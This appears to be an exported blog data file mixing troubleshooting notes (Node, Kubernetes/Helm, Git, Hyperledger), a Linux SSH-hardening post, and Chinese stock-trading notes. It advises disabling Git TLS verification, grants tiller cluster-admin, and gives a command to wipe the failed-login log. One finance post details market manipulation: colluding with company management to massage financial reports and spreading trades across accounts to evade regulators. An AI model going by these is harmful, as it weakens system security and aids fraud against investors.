I use vscode to write node.js, more specifically, to write javascript style language, like typescript.\n    - but when I use `buffer` type on typescript, there are always pop up a red dot which notice me `[ts] cannot find name 'buffer'`. That's weird since buffer is a normal variable type in the most programming language, so is it in typescript. However, it still annoying me. \n    - Here is the conclusion: some node environmnet types are needed when use typescript, for some types are not embeded in typescript. For this limitation, we might be able to get around by stubbing those interfaces in the future. \n    - I admit it's odd to have to include node typing for a fornt-end project, but when I try install the envrionmetn typeings to see if it gets around on my issues. It workd for now. \n    - `npm install --save-deve @types/node`\n4. This day, I try to use RocketMQ to build a connection between nodejs and Java, nothing happends... \n5. When I using npm install to install grpc, processes stucked in `node-pre-gyp install --fallback-to-build --library=static_library`. Waiting over than 1 hours or more still cannot finished that course. Besides, when I checked the cpu usage of the machine, it seems that all the processers are running in low load, which means that the machine works fine. Now that the trouble must caused by the npm. It looks like shortage of some optional package which makes the process stagged. \n    - using `yum install -y node-gyp` to install the node-pre-gyp or somethings else(I am not sure what it is. But when all installation stuff done, then the npm install going smoothly without any hitch). It is normal when the npm install slow down or even unresponsive when `node-pre-grp install`, after all the build progress consume some system resources.\n6. running command with nodejs: https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top\n\n# Kubernetes\n1. when you have already installed docker-ce or other docker toolkit, you may come into installation conflict unless you choose other installation method instead of using package management tool like `yum/apt/...`. \n    - otherwise, you should uninstall the old version of docker, then run `yum install -y etcd kubernetes`\n2. when I using pod deployment to run a hello-world cluster, I found that k8s can not let the container running and unable to create replication. \n    - Use `kubectl describe pods` to get more information. Scrolling down to the last line, I saw that it's going to readhat.com and failing. Why it's using RedHat repo？ Did it should pull from the docker hub?\n\n    ```\n    Error syncing pod, skipping: failed to \"StartContainer\" for \"POD\" with ErrImagePull: \"image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)\"\n\n    ```\n    \n    - using `yum install -y subscription-manager rhsm` to help the k8s pull from the right place\n    - But unfortunately, I failed to install both rhsm and subscription. In fact, rhsm has been replace by RedHat's subscription-manager. It cannot works for my machine, yet subscription-manager installed successfuly.\n    - So I have to search the old version of rhsm and then use rpm installation tool to force my systemd to use rhsm.\n    - Here is the package download address: \n    - https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm\n    - https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-1.19.10-1.el7_4.x86_64.rpm\n    - Both rhsm and certificate should installed in order, the rhsm is rely on the certificate tool. \n    - Make sure you download the two package on the same folder and use `rpm -ivh python-rhsm-*.rpm` to keep the installation in order.\n\n3. After I deal with the rhsm ERROR, kubernetes throw up another problem immediately to me, compelling me to keep dive into the OPS stuff with unprepared technology experience. \n\n    ```\n    image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (net/http: request canceled)\n    ```\n    \n    - As plain as on the screen, kubernetes cannot interactive docker to pull a image from hub. Most of the solution that I used for settle is using the proxy(To bypass the GWF).\n    - Using `docker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest`, it looks good to me.\n\n4. If you choose `hostpath` as your presistentVolume, you can only use `ReadWriteOnce` for single node, since you developments environment is single node.\n\n5. And if you create a service without defining a selector as in a yaml file, like most people do in case to select the pods, endpoints will not be create. But, fortunatly, kubernetes offers a alternative way to make sure you container, which deployed in some specific pods, to communicate with other exogenous container. \n    - declaring another kind as endpoints, as you can noticed when you use `kubectl get endpoints`, which endpoints defined as a permanent word in kubetctl, to create a type of component, with setting some propetries.\n    - when it comes to the imperative complexity, multiple ports is be requisted in many services deployment. As defined in whether kubernetes or any network policy, exposing more than one port is necessary. Kubernetes supports multiple port definitions on a Service object. Resulting from that predefined statements, when using multiple ports you must give all of your ports names, so that endpoints can be disambiguated.  \n    - Endpoint will not be alloted unless the pods be created.\n\n6. helm init failure becuase of the image pulling crash. So I need to setting a docker-proxy and daemon-reload/restart docker to pull the images again.\n7. Though helm init successfully when image has been pulled, helm still cannot connect to the kubernetes api server. It shows:\n    ```\n    Error: Get http://localhost:8080/api/v1/namespaces/kube-system/configmaps?labelSelector=OWNER%!D(MISSING)TILLER: dial tcp [::1]:8080: connect: connection refused\n    ```\n    - It seems that the tiller pod in kubernetes cannot connect to the api servier cause lack of HOST or DNS. \n    - Using `docker exec -it container_ip env` to get the environment variable to check whether the KUBERNETES_SERVICE_HOST exists. Then I got the 10.254.0.1, it looks like the default kuberentes service IP\n8. In the Great China, most of the Internet stuff about the goolge cannot be accessible. But some tech company are willing to help other programmer to get access google cloud, npm and any repo which is blocked in the outside of the GWF. It is the same as the helm. The final solution for me is installing an aliyun version of helm to get to start the tiller. Also, don't forget to get the right version matching between client and server.\n    ```\n    helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts\nkubectl create serviceaccount --namespace kube-system tiller\nkubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller\nkubectl patch deploy --namespace kube-system tiller-deploy -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccount\":\"tiller\"}}}}'\n    ```\n\n9. Noticed that when I using 2.10 version of helm, there is an gorouting error happend by typing `helm ls`\n\n    ```\n    panic: runtime error: invalid memory address or nil pointer dereference [signal SIGSEGV: segmentation violation code=0x1 addr=0x30 pc=0x1276506] tiller\n    ```\n    - That is a dev bug undering the development of the helm.\n    - downupgrde you helm to 2.9.1 will be fine.\n\n# Git\n1. `Encountered end of file`\n    - Add $GIT_CURL_VERBOSE=1 can solved that problem \n2. Still be annoied by the useless private gitlab server, problem comes one by one without any obviating indication. \n    - `Peer's Certificate issuer is not recognized.`\n    - two solutions, the first one is setting GIS_SSL_NO_VERIFY environment parametes to true\n    - the another one is using `git config --global http.sslVerify false` to solving the config missing\n3. git can not clone a repo from a unsafe link \n    ```\n    fatal: unable to access 'https://***.git/': SSL certificate problem: self signed certificate\n    ```\n\n    - solution: add a environment in the front of you command:\n    - GIT_SSL_NO_VERIFY=true git clone ****\n4. what if you used a Github account on your mac before but now your changed your account?\n\nTry remove your account:\n\n```\n$ git credential-osxkeychain erase\nhost=github.com\nprotocol=https\n[Press Return]\n```\nand using `git push`  or whatever the command to handle git and login your git account again.\n\n# Hyperledger Fabric\n1. `Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host`\n    - Small fix difícil de conseguir para Hyperledger Fabric 1.1.0 corriendo en Docker Swarm. Multiples organizations corriendo en un mismo host:\n    ```\n    createChaincodeServer -> ERRO 02a Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host\n\n    Resulta que para la versión 1.1.0 de HLF se requiere incluir esta propiedad en el environment section del docker-compose.yaml de los peers:\n\n    CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:7052\n    ```\n\n2. `Error: Error: Calling enrollment endpoint failed with error [Error: read ECONNRESET]`\n    - When I try to monitor a event hub for chaincode calling in node SDK, some error throw up after I use my own script to create channel, join, and other stuff. \n    - The weird things is that, checking the ca container looks good to me. Then I recalled that if it is my fault that not to add remove temp file cache in scripts. So I rechecked it again, however, I cleared the cache. \n    - How can this happend without any change I did to the server. So I debug my script by line: after I started up the network, I did other channel stuff in few seconds. It surprised me that the log did not throw the error mentioned above. \n    - It turns out that I can create the channel immediately when I started up the docker-compose.\n    - Add sleep 5 to the scripts will be fine.\n\n3. `Promise is rejected: Error: 2 UNKNOWN: access denied: channel [mychannel] creator org [Org1MSP]`\n    - orgpeercan not be found in channel\n4. `error executing chaincode: failed to execute transaction: timeout expired while executing transaction`\nProbably because of the chaincode is not installed perfectly","tags":["troubleshooting"],"categories":["Tech"]},{"title":"Prevent your machine from attacking","url":"/2017/09/21/Prevent-your-machine-from-attacking/","content":"\nYou may heard about botnet, which is a network of infected computers that can be controlled remotely, forcing them to send spam, spread viruses, or stage DDoS attacks without the consent of the computers’ owners.\n\nIn the public network, hackers keep cracking your machine and want to capture your machine to become botnet.\n\nHowever, most of us still feel confident about the cloud vendor and feel relief that we still not losing the control of the machine. But if your carefully check your usage of the cpu/memory, login history and other record. Someone may inject some bitcoin mining scripts on your machine a year ago. \n\n## Intro.\n\nTry this command to watch the login record:\n\n    du -sh `ls /var/log | grep btmp\n\nThis file storage the login fail record of ssh. The larger size of the file, the more dangerous your server is undering. This is a simple and old cracking method, but still efficient.\n\nLarger part of the server use weak password, which using `root` as login username, password is sucession number and still using `22` as default login port. \n\n## Check More Record\n\n+ `/var/log/wtmp` is used for record sucessful login information. This is a binary format file. Only using `last` command is able to check its contents.\n\n```\nroot     pts/0        *.*.*.*    Sat Feb 16 12:29   still logged in\nroot     pts/0        *.*.*.*   Fri Feb 15 20:42 - 20:55  (00:12)\nroot     pts/0        *.*.*.*   Thu Feb 14 13:27 - 18:55  (05:27)\nroot     pts/0        *.*.*.*    Wed Feb 13 21:31 - 23:07  (01:36)\n```\nCheck the top 10 malvolence login IP:\n\n    sudo lastb | awk '{ print $3}' | awk '{++S[$NF]} END {for(a in S) print a, S[a]}' | sort -rk2 |head\n\nCheck the times of malvolence login time:\n\n    lastb | awk '{ print $3}' | sort | uniq -c | sort -n\n\nIf you want to clear this log:\n\n    rm -rf /var/log/btmp\n    touch /var/log/btmp\n+ `/var/log/btmp` is used to record the failed login IP. Using `lastb` to check its content. \n\n+ `/var/login/lastlog` is used to record user login history. Using `lastlog`\n\n+ `/var/login/utmp` is used to record current user information. Using `who`\n\n## SSH\n\n+ change `ssh` default port\n```\n    vi /etc/ssh/sshd_config\n```\n+ restart `sshd` service \n```\n    systemctl restart sshd\n    systemctl status sshd\n```\n+ add `iptables`\n```\n    # iptables config file location: /etc/sysconfig/iptables\n    iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 1000 -j ACCEPT\n    # add 1000 port rule\n    service iptables save\n    service iptables restart\n```\n+ or using `firewall-cmd`\n```\n    firewall-cmd --state\n\n    systemctl start firewalld\n    systemctl enable firewalld\n\n    # check default/active zone \n    firewall-cmd --get-default-zone\n    firewall-cmd --get-active-zones\n    # open port\n    firewall-cmd --permanent --zone=public --add-port=22/tcp\n    firewall-cmd --permanent --zone=public --add-port=1000/tcp\n    # reload firewall \n    firewall-cmd --reload \n\n    # check exposed port \n    firewall-cmd --permanent --list-port \n    firewall-cmd --zone=public --list-all\n```\n\n## Using strong password \n\n```\n    passwd\n```\n\nranddom password generator\n\n```\n    # echo $(getRandomPwd 10)\n    # echo $(getRandomPwd)\n    getRandomPwd(){\n        num=32\n        if [ $# == 1 ];then\n            num=$1\n        fi\n        echo \"$(date +%s)$(shuf -i 10000-65536 -n 1)\" | sha256sum | base64 | head -c $num ; echo\n    }\n```\n\n","tags":["Linux"],"categories":["Tech"]},{"title":"MongoDB vs PostgreSQL in GIS","url":"/2017/09/11/[GIS]MongoDB vs PostgreSQL in GIS/","content":"\n开源的空间数据库比较少见，最近一个小项目需要用到，所以特地还对比了一番。\n\nPostgreSQL 能够使用PostGIS的全套功能，当然这并不是一个优势。但是可以做一些有用的东西，比如你可以查找在地图上的某一个半径内的兴趣点。就可以用earth distance的模块和gist索引。\n\nMongodb的话就可以使用geoNear的方法，同时搭配的就是2d空间索引。其实大同小异。\n\nPostgreSQL的查询很快速而且很灵活，可以很好的扩展。在MongoDB上会麻烦一些。\n\n在考虑这两者的时候，也需要考虑很多如：\n\n在SQL方面支持更好的是\n\n数据是否是结构化的，是否会有一些半结构化的存在。\n\n是否需要ACID的保证。\n\n是否需要查询多表\n\n在MongoDB支持更好的是\n\n是否需要高强度的扩容。\n\njs 或者 JSON的编程方式\n","tags":["database"],"categories":["GIS"]},{"title":"游资 买入 卖出-主要是想体验一下交易","url":"/2017/05/11/[finance]-top-buyer/","content":"\n所以就要做一些笔记呗\n\n有一些摘自知乎和雪球。观点和意见都不尽同意。\n\n## 入场和出场\n\n假如我是一个庄家，我会怎么做？\n\n股票市场的定律是一赢两平七亏，意思是70%以上的人都会亏损。那散户如何才能站到赢利的10%人的群体中？我认为，机构为了赚散户钱，不断的在研究散户心理和行为学，我们散户不妨反过来，把自己当成机构投资者，也来研究一下机构的心理和行为学，这样才能在这个充满陷阱、欺诈、骗术和谣言四起的市场里立于不败之地。\n\n如果我是机构投资者，要想做一支股票，我认为我先要找到一支大小合适，前景无需多么优秀，但几年之内绝对不会倒闭的那一种。然后我去拜会该公司领导，告诉他我想投资他那支股票，请他们配合。如何配合呢？就是在我吸筹时，在公报时尽量将业绩放平，或者适当隐藏利润，这一点公司很容易做到，只要对报表进行适当调整就行了，例如，将某些损益一个季度提完，使其报表看上去亏损；或者将后面数年的费用半年摊完，这都使得当期报表非常难看。\n\n在这之前，我肯定是要进一些筹码的，这些筹码主要用来砸盘的。怎么收集这些砸盘的筹码？我不会每天慢慢去收集，因为这样会使股票天天上涨，反而难以收到足够的筹码，还容易被散户抢酬，并使技术指标形成向上趋势，更使自己收集成本提高。我会在某一天用大涨的办法来收集，当连跌数天后，散户都悲观失望，猛然一个大涨，套牢的看到了希望，不会抛出；而短线获利的，可能就交枪了，其实，在这个价位我只是要砸盘的筹码，不需要收集很多，因此用猛然大涨的办法就很容易达到目的（见底前平台，成交量会放大）。\n\n第二天来个低开。为什么要低开而不高开，因为我昨天收集的筹码并不准备获利，而且要让昨天追风进去的短线筹码帮我砸盘，如果高开，很容易让短线筹码获利，他们就会在下跌途中有更多的资金来跟我抢酬，所以一定要低开，消耗这些短线资金（盈利的短线盘很关注这只股，而亏损的短线盘则极少再次关注它）。\n\n在这个下跌途中，我将逐步用单托底，因为我要形成自己的底仓（难道这不会造成成交量的放大，而非极度缩量？）。经过几天的连续下跌，有些割肉的筹码就会回补自己的仓位，这时候我不能让他们回补，我必须迅速的吃上去让他们追风（直线拔升方式常见的原因），当形成追风盘时，我将在底部的部分筹码高抛，一是为了降低成本，二是腾出资金，然后再迅速的砸下去。同样的，我会边托边砸，这样一来我就会得到更多价格更低的筹码。\n\n当跌到很低位时，基本上就没人和我抢筹码了，因为在这个下跌途中，我通过不断的高抛低吸，不断的大幅度振荡，将大部分抄底的，抢反弹的都套在下跌途中，或者将他们亏损怠尽，使其不敢再来涉足这个股票，这时候我的目的就达到了（把买盘都赶出去）。而公司的配合在这时就非常关键，长时间的业绩没有任何起色，使大部分散户因怀疑其会不会ST，因而恐惧惊慌，高位筹码就会不断的掉落，我就可以在底部横盘当中不断的高抛低吸来收集筹码，这个可能需要较长时间，关键看顶部筹码掉落程度而定，如果高位筹码长时间的不松动，那我就不会去拉这只股票。（筹码流动）\n\n当筹码收集足够多时，公司的业绩也会转好了，因为在我收集筹码当中，公司将后面几年能想的出来的损益，或者费用都在那一年半载中摊完了，后面的报表当然好看。这时候我拉起来毫不费力，也无需多大成本。当这个市场里其他人看到这个股原来这么优秀，必然跟风者众，我就在这这当中逐步减仓。（（1）筹码结构（资金结构）（2）技术指标（3）业绩预期）\n\n公司能如此配合，那他能得到什么好处？其实很简单，我将股票拉到高位，他们也能卖个好价钱；在低位时，他们同样可以购入自己的股票，还能挣得名声，这样一来收益会相当可观，何乐而不为？\n\n这当然要和大盘走势相同，在这中间，散户该知道怎么办了吧。\n\n当然，如果我做庄，还必需考虑很多问题：第一是证监会的监控，他们虽然老虎不敢碰，或者就是为虎作猖，但捏死个把苍蝇还是不成问题的，所以，操控股票不能让他们抓住把柄，这时候就要考虑多户头，或者拉几个私募大户集体作战。\n\n第二要考虑产业资本的问题，如果我们拉的时候，他们看到利润可观，结果大量抛出筹码，那我们就惨了，必然会亏本出局，在做之前就必需先和他们沟通好，而且还要了解他们手上的流通盘是多少，抛售意向如何，这就是大小非问题。\n\n第三个要考虑的是老庄，如果这个股没有被老庄放弃，那我是尽量不会去碰的，因为一但被老庄反做，那你死得就惨了，就像中国联通套游资一样，那死得是非常惨的，所以，选股非常重要。\n\n第四个就是大盘状况，跟风的多不多，社会上的存量资金足不足，就像现在这样，大部分散户或者大户都被大宰一刀，这时候就不适宜做股票，你拉人家卖，结果把自己套在里面。那现在最适宜的就是砸股票。一般人都有个心态，20元买的股，跌到15元不卖，跌到10元不卖，跌到5元仍然没多少会人卖，但是你要跌到2元再拉回4元，不少人一看翻倍基本上都会割肉的，特别是长时间的向下或者横盘（当然，翻一倍后作中期调整的概率可能性，在操作系统上可认为是100%）。\n\n如果这些问题都解决了，砸盘就要开始。砸多少为适宜？根据大盘状况，每天操盘必需跟着大盘走，当大盘大跌时，你必需深砸下去，这时候成本很低，只要用少量筹码将关键点位砸开即可，会有止损盘帮你接着砸下去。但是尾盘必需进一些筹码，防止第二天大盘走低或者走高，有一定量筹码就好灵活掌握，也就是说，要在操盘时盯着指标股（借势才是合格的操盘手）。\n\n为什么要盯着指标股去做？关键就在于成本，随着大盘波动，你的成本最低，指标股跌时，你也跌，所用砸盘筹码量最少，因为没有多少人敢买，可以深砸（并不是什么时候都可以深砸高拉的）。当大盘涨时你去拉，同样无须买多少，只要将关键点位的筹码买掉即可，有人会将股价推上去，到一定高点，你还可以将低位进的筹码出掉一些，这样可以腾出一点资金做一点差价。所以，我们看到的股市局面就是要涨一起涨，要跌大家都去跌。\n\n在股市中的人分好几种，趋势投资者，套牢后不理不睬者，技术派，基本面派，长线客，短线炒家等等。\n\n我要在这个股票里做庄，这些人我都要面对，尽量的让他们在我控制的这个股票里少赚或者割肉而去，这时候我就要用很多办法来对付，因为他们赚多了，意味着我就赚少了，他们不割肉，我就赚不到钱（针对某一只股票，主力要面对的是阶段性对手盘，同样阶段性对手盘也面对着阶段性对手盘）。\n\n对趋势投资者，我没什么好办法，只能将他们看做锁仓的一员；但对其他人，我平时的吃喝玩乐就全靠他们了。我一般最喜欢套牢后不理不睬的，这些人把钱交给我后帮我锁定了大部分筹码，使我在底位有充足的资金纵横驰骋（？待定，低位时主力要高抛低吸短差收股票，但因持仓量少对盘面的控制力差，所以非常需要锁仓套牢盘，套牢盘的不动，造就了主力（新资金）的异动（才能让交易者看出来））。\n\n基本面派也是我喜欢的第二位，因为当我将股价拉高后他们基本就接手了，企业的基本面在我拉高股价后变得非常亮丽，他们就会来接盘；等他们接完后公司基本面就发生改变，他们在低位就将筹码再还给我。\n\n技术派一般短线较多，喜欢做波段，这里的人有自认为技术高明的，什么KDJ金叉、死叉，什么MACD、CR、量价关系，什么费波纳奇黄金分割位，什么艾略特的波浪理论，还有江恩曲线等等，等等，但我做股票一般不看这个，我一般只盯着今天我下多少单，在某些价位进来多少单，大一些的户头在什么价位进出。这个对我来说非常关键，因为这决定了第二天该如何操作，有时候需要对他们安抚，让他们帮忙将股票在手上多留几天，以使活动筹码减少。但有时候就必须让他们出局，特别是短线客，当今天发现短线游资进来多了，第二天不管怎样都要将他们杀出局，哪怕逆大盘而动（不杀不行啊，不杀盘面就会失控，破坏坐庄计划）。回过头来看，呵呵，真搞笑，K线走的还真符合某些技术指标特点。偶然乎，必然乎（有意思，偶然中的必然）。\n\n这里解释一下我为什么要猛杀游资。\n\n其实这关乎自己的短期收益，因为短线客和游资的钱最好赚，他们持筹码的时间短，可以使我非常短的时间里获利。例如套牢盘，你只能一次性的赚他一下，他然后就不动了，你就拿他一点办法都没有，这中间有时候长达几年，在这几年里我可是要吃要喝的；基本面派也使我获利不多，因为他们的利润我还要和公司均分。\n\n但短线客和游资就不同了，我在一个波段中就可以获利丰厚。那怎么做呢?\n\n第一是逐步拉升，这时候技术指标就开始走好，技术派的人一看技术指标，一般都容易被诱惑进来，这中间我就边拉边卖，需要控制的就是在顶背离之前（背驰段之中）将筹码交他们手中，使他们看上去技术指标仍然没有到顶，股价还可以涨得更高，这时候第二天来个冲高回落，然后第三天猛然下跌，他们基本上就开始交枪了（这个动作很常见），不用我来，股价就下去了，这中间自然我设定好价位来捡果实。\n\n对游资更是这样，上半段我来拉，游资一看股价看涨，立即蜂拥而来，那下半段我就将部分筹码交给他们，第二天我来个低开低走，游资一看势头不对，立即出逃，这时候我就要看出逃数量，并计算自己的成果，如果出逃数量足够多，那我下午就拉起，因为大部分短线客都走了，我就不需要支付多少利润出去，很容易将股价拉起来，而我在这两天来回的差价最少是赚交易额的3%左右。\n\n但发现没有走多少时那我就继续向下做。这就是不少散户疑问的，为什么我一卖就涨，一买就跌啊?因为你跟大部分人的行为是一致的。（能坐庄的都能打单，对筹码结构很清楚，主力当然根据短线客中大部分人的行为行动）呵呵。\n\n二、坐庄的风险是什么？\n\n1）监管风险：一是操作这只股票的不会是我一个庄，一般都是邀请几个人来联手，就像大草原上的猎狗一样，采用群体战术才能更容易获得成功。要是一个人，第一不一定有这个实力，第二就是太容易被人抓住把柄，搞不好打不到狐狸还惹一身骚，所以，邀请朋友来合作是肯定的，就谁主谁次的问题了。既然是合作，风险也是明显的，当市场出现波动时，其中一个朋友立马放水，这时候你就栽了，很长时间的辛苦都会打水漂。\n\n2）大势风险：还有一个问题是，当市场趋势向下时，自己却没发现，因为筹码还在自己手中，就想硬扛，这时候同样会完蛋，前几次大牛市结束后不少庄家摔跟头就在这上面。那么，应该如何应对风险，这就是，第一注意指标股的动向，因为坐庄的人对大盘指数动向非常敏感，当指标股向上，而一些主力控制的次要股却滞涨，或者有掉头迹象，那我就要先于股指下跌之前想办法将手里的筹码尽量的都交到散户手里去，尽量的腾出现金，只要手上有充足现金，是涨是跌我都不怕。涨了，我手上剩余的筹码完全可以将其打下来；要是跌了，那就可以购买更多的筹码。当大盘到底准备反转时，也同样会痕迹明显（从这里来看，就是指标股向下，主力控制的次要股却滞跌，或有掉头迹象）。\n\n三、谈谈顶和底的问题。\n\n现在不少人都在关心大盘跌到什么位置才是底，2000、1800、1235？说老实话，我不知道，我不但不知道大盘会跌到什么点位为底，我会连自己坐庄的股票能跌到什么价格为底都不知道，怎么能测算大盘。有人说，20元跌到5元行不行？到底了吗？我说不行，也许跌到1~2元，也许会到8元就算到底了，在股市里没什么顶和底之说，真正起作用的就是供求关系，当跌到供求平衡时，底自然就到了。\n\n例如我的股票，我每天都在让它波动，涨涨跌跌，但某一天我发现，我卖出去的股票，用这些钱买不回来更多或者同样多的股票了，这时候我就不可能再向下做了，这里就应该是它的底了。也许是5元的位置，也许1元的位置还不到，又有谁知道在哪个位置能达平衡呢，只能不断的测试。\n\n顶部也一样，我向上拉，却没了跟风的，那我高价买来的股票又能派发给谁？当然，我拉高给你看价格却又是一码事，底部也一样（同样，震仓中继调整其实就是出货和吸筹的变种，只不过该时段的对手盘是短线盘）。\n\n在指数里，同样如此，如果进出资金能达到平衡，那指数就到底了；如果不能，一直要跌到平衡为止。\n\n四、庄家在下跌中是如何赚钱的？\n\n不少人有时候不理解，庄家的成本是20元，他将股价打到10元或者15元，他不也亏了吗？这真是傻庄，其实散户是不明白的，庄家赚钱的手段很多时候是和散户不同的。我来举个例子，600331，当时有些机构的成本是70多元，但开盘后连砸7个跌停板，最后在38元被打开，按理说机构亏惨，如果庄不砸跌停板，出货的价位不是高些吗？损失不是小些吗？\n\n其实不是这种情况，不砸跌停板出货，散户也会跟着出；而承接盘有限，机构的货是出不掉的，慢慢的下跌机构损失会更惨，并且你由于价格没有吸引力，找不到对手盘，那就成了钝刀子割肉，痛苦只有自知（主力的弱点）。\n\n采用了猛砸跌停的办法，市场的目光就会集中到那上面来（市场知名度），当跌到一半时，有协同私募或者机构开始巨量吃单，因为在这几天的跌停中市场的关注度非常高，而出现巨单吃货了，这说明这时的股价应该反弹了，技术上超卖出现，股价腰斩，怎么着都要反弹个百分之十几到二十，所以散户、大户一哄而上，机构卖单被哄抢。但现实情况并不是散户和大户们所想象的，在熊市中放巨量的往往都是出货，看似大单扫货，其实就是庄家们设的陷阱，然后利益分享。\n\n再举个南车上市的例子，上市价超过发行价60%以上，5个机构席位齐刷刷的排在购买的前5名，这些机构傻了吗？非要溢价60%来接盘，特别在熊市中，还怕买不到筹码？如果等几天再买，也许到发行价都有可能。其实，机构们一点不傻，这不过是机构之间穿连裆裤的表演，那些获得60%以上溢价的会给这些接盘的机构分配一定利润的，而且这些机构买入的也并不多，更多的筹码是溢价交给了其他人，包括大量散户手中了。对接入大部分高溢价筹码的这部分人，那些获利者就不用考虑什么了。\n\n这里我还回到前面，600331，那些机构70多元的成本，却卖出38元，那不巨亏吗？这不过是散户思维，从现金数额来说，机构是大放血了，但从筹码角度来说，机构可以按现在复权价格18元，等于赚了一倍的筹码，只要涨回30多，机构的本就回来了，而那些守在38以上的人，只好等驴年马月了。这还不排除后面继续下跌的可能，如果股价继续下跌，机构就更容易获利。\n\n所以，我操作的股票我就希望它能跌下来，尽量的低。举个例子，在20元到18元区间，我出掉了手中的20%股票，在18到16区间我又出掉18%的股票，后面我就要回补，因为在这种下跌的情况下，不少止损盘开始涌现，还有些人要补仓，这时候我就要根据筹码情况做反弹，为什么要做反弹呢？主要是吸引抄底盘进来，当然，如果抄底盘巨多，第二天我就再反手做空。\n\n（主力的优势在于可控盘，短期顶底都是自己的，短差做起来极端顺手，所以短线盘的出路就在于：利用船小好调头的优势使操作水平高于主力，最起码要和主力持平。根据这里所述，思路之一即对抄底跟风盘的判断，但是主力的弱点同时也是主力的优点，主力很容易了解到抄底跟风盘的情况，而散户则不知。这就构成了一对矛盾，导致主力和散户优劣平衡。）\n\n一般情况下第一天的反弹抄底的是不多的，只要进行两天，散户一看，这个股怎么天天涨，特别是割肉盘和补仓盘，他们一般都会追进来，而高位的一看涨了几天，不卖算了，等几天也许还能赚点。这时候我再反手做空，将他们套住。这中间我赚多少？因为拉的当中还要派发利润，所以，每一段的下跌可以保持一定的利润。\n\n那我为什么希望我坐庄的股价尽量低？你想想，你如果开个商场，你是希望你经营的货物便宜还是贵？自然是便宜的好，因为这样一来所用资金量就少。10元加1元，人家就嫌贵了；如果1元加1角，不显山露水的，没人和你计较，而和10元和1元所赚比例却是一样的。股票也一样，1元股票涨到1。5元，没多少人感觉什么；但10元涨到15元呢？这就是中国股票市场牛短熊长的根本原因，庄没几个希望股价很高来增加自己的成本。\n\n五、谈谈散户的和庄家的定位问题。\n\n在一个大草原上，小股民就是羊群，而庄家是狼。我这样定位大家可能没什么意见吧，中国股市里70%股民赔钱，这基本上是真实的。就像打麻将一样，四个人打，三个人赔。这三个人的钱自然流入到那一个人口袋里去了，也就是说，股民所赔的数万亿既没消失，也没挥发，而是转移，转移到少数人口袋里去了。这就是狼吃羊的故事。\n\n在草原中，羊看到狼会跑，为什么？怕它把自己吃了。但在股市里却不一样，大部分人买股票喜欢买有庄股，说有庄股拉起来就凶了，会涨的快，最好是强庄。羊在草原上吃什么？吃草。它会选择有狼的地方去吗？而且这个狼还非常彪悍。绝对不会。\n\n这就是股民的自我定位上的错误，你本来是羊，吃草就行了，这个草就是找个业绩良好的股，在合适的价格下把它买来，然后每年等着分红送股来升值（中国股市分红吗？）。但大部分股民不这样，总想跟着狼后面吃点残羹剩渣，这还有不亏损的道理？所以，大草原上的羊群大部分保留，而股民大部分都被吃了。\n\n六、主力是如何对散户进行教育灌输的？\n\n我说的这个题目，不少人可能觉得新鲜，没听说过这样的事，主力还能对我进行教育灌输？是不是维稳或者保障群众财产性收入之类的。我说不是，其实你没感觉，那就是主力的成功，主力不需要你感觉什么，只要你按着他的指挥去做就行。主力有这样的本事？那他叫我割肉我就割肉，让我站顶我就站顶，那我的钱不都让主力赚去了？对，情况就是这样。\n","tags":["finance"],"categories":["Lifestyle"]},{"title":"业余时间开始二级市场交易","url":"/2017/04/12/[finance]-top-pop-stock/","content":"\n所以就要做一些笔记呗\n\n有一些摘自知乎和雪球。观点和意见都不尽同意。\n\n\n## 《如何看懂龙虎榜》\n\n一、纯游资对决(交易席位均为游资)  \n\n1、买卖双方力量比对，买方总金额越大越好。买方席位前5名的总资金要远大于卖方席位前5名总资金。并且买一的资金要远大于卖一的资金，最好是1.5倍以上。而买一和买二的金额差不能太大，否则会容易造成一家独大，后市意味着抛压也大。\n\n2、如果是第一次涨停，在龙虎榜交易数据当中，买方数据为纯买入最好，表示新进资金入场后市还将走高。另外第一次涨停后留意买一席位是直接出局、锁仓、继续加码买进还是做差价？通常直接出局代表了行情一日游，锁仓说明行情可持续，等待别的资金接力拉高。继续加码买进表示强烈看好。做差价说明买一实力不够强。个股的大行情都是游资接力完成的，不会是某一个游资来推动整轮行情的发展。因此通常2-3个涨停之后如果买一继续锁仓，别的游资只会是观望了，因为持仓量太大造成的抛压也大。只有当买一出局后，别的游资才考虑进场接力拉升。所以说行情的初中期换手率是一个非常重要的参考指标。一个游资的离去会吸引另外游资的进驻。另外还有一种情况就是边拉升边对倒的游资，对倒涨停是为了投入少量的资金来达到涨停效应，持续力不会太强。\n\n3、留意游资的身份和操盘风格，是一线知名游资还是名不见经传的游资？在最近是否经常上榜？操盘风格如何？一日游为主还是波段为主或者是喜欢与机构共舞等等。通常一日游资口碑不太好，上榜了也不会对行情有推动作用，反而打击做多的积极性。波段游资则比较受欢迎。\n\n4、留意龙虎榜数据买方席位知名度，越知名越好，数量越多越好。比如银河绍兴路、光大杭州庆春路、光大奉化南山路、财通温岭东辉北路、中信杭州延安路、中信杭州定安路、华泰益田路荣超商务中心等这些著名游资出现3个以上，代表着一线游资对这个题材个股的高度认可，后市持续力强。\n\n二、游资和机构博弈(交易席位为游资机构混杂)\n\n1、买方中机构出现的数量越多越好，机构当日买入金额占总成交金额比例越大越好。一次性锁定筹码集中度越高越好。因为多家机构进驻的个股基本面都比较不错，符合市场调研评判的标准，通常引发中级行情！当游资和机构达成共识合力推升股价，短线往往爆发力比较强，后市继续上涨概率也很大。\n\n